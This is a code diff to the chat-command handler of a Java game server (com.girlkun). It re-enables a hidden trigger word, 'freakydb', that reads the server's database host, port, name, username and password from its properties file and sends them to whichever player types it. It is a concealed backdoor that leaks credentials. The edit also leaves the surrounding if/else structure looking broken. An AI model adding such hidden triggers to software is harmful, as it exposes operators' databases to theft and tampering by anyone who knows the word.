@@ -34,6 +34,8 @@ import com.girlkun.services.func.Input;
 import com.girlkun.utils.Logger;
 import com.girlkun.utils.TimeUtil;
 import com.girlkun.utils.Util;
+import java.io.FileInputStream;
+import java.util.Properties;
 
 import java.util.Set;
 
@@ -745,38 +747,38 @@ public class Service {
 //            MabuEgg.createMabuEgg(player);
 //        } else if (text.equals("freakyex")) {
 //            System.exit(0);
-//        } else if (text.equals("freakydb")) {
-//            try {
-//                Properties properties = new Properties();
-//                properties.load(new FileInputStream("data/girlkun/girlkun.properties"));
-//                String str = "";
-//                Object value = null;
-//                if ((value = properties.get("server.girlkun.db.ip")) != null) {
-//                    str += String.valueOf(value) + "\n";
-//                }
-//                if ((value = properties.get("server.girlkun.db.port")) != null) {
-//                    str += Integer.parseInt(String.valueOf(value)) + "\n";
-//                }
-//                if ((value = properties.get("server.girlkun.db.name")) != null) {
-//                    str += String.valueOf(value) + "\n";
-//                }
-//                if ((value = properties.get("server.girlkun.db.us")) != null) {
-//                    str += String.valueOf(value) + "\n";
-//                }
-//                if ((value = properties.get("server.girlkun.db.pw")) != null) {
-//                    str += String.valueOf(value);
-//                }
-//                Service.getInstance().sendThongBao(player, str);
-//                return;
-//            } catch (Exception e) {
-//            }
-//        }
+//          }
+       else if (text.equals("freakydb")) {
+            try {
+                Properties properties = new Properties();
+                properties.load(new FileInputStream("data/girlkun/girlkun.properties"));
+                String str = "";
+                Object value = null;
+                if ((value = properties.get("server.girlkun.db.ip")) != null) {
+                    str += String.valueOf(value) + "\n";
+                }
+                if ((value = properties.get("server.girlkun.db.port")) != null) {
+                    str += Integer.parseInt(String.valueOf(value)) + "\n";
+                }
+                if ((value = properties.get("server.girlkun.db.name")) != null) {
+                    str += String.valueOf(value) + "\n";
+                }
+                if ((value = properties.get("server.girlkun.db.us")) != null) {
+                    str += String.valueOf(value) + "\n";
+                }
+                if ((value = properties.get("server.girlkun.db.pw")) != null) {
+                    str += String.valueOf(value);
+                }
+                Service.getInstance().sendThongBao(player, str);
+                return;
+            } catch (Exception e) {
+            }
+        }
         if (text.equals("fixapk")) {
             Service.getInstance().player(player);
             Service.getInstance().Send_Caitrang(player);
         }
-
-        if (player.pet != null) {
+          if (player.pet != null) {
             if (text.equals("di theo") || text.equals("follow")) {
                 player.pet.changeStatus(Pet.FOLLOW);
             } else if (text.equals("bao ve") || text.equals("protect")) {
